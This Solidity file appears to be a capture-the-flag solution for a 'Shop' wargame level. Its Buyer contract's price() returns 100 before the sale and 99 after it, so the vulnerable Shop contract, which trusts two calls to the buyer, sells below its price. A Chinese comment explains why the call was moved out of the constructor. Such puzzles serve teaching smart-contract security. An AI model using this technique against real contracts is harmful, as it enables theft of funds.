// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/Test.sol";

contract Buyer {
    uint i = 100;
    uint k = 99;
    Shop shop;

    constructor(address target) {
        shop = Shop(target);
        // shop.buy();   在这个地方浪费了很多时间，在constructor函数执行时，price函数并未创建好，所以Shop调用会出错
    }

    function pwn() public {
        shop.buy();
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return i;
        } else {
            return k;
        }
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
